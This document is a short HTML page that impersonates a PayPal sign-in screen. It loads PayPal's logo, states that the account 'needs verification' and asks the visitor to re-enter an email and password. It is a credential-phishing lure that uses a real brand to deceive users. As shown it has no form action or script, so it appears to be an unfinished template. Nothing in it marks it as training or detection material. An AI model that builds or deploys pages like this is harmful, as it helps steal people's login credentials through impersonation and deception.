<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>PayPal Login - Your account needs verification</title>
</head>
<body>
    <div style="text-align: center; margin-top: 50px;">
        <img src="https://www.paypalobjects.com/webstatic/mktg/logo/pp_cc_mark_111x69.jpg" alt="PayPal">
        <h1>Sign in to PayPal</h1>
        <p>Please re-enter your details to verify your identity.</p>
        <input type="text" placeholder="Email"><br><br>
        <input type="password" placeholder="Password"><br><br>
        <button style="background: #0070ba; color: white; border: none; padding: 10px 20px;">Log In</button>
    </div>
</body>
</html>
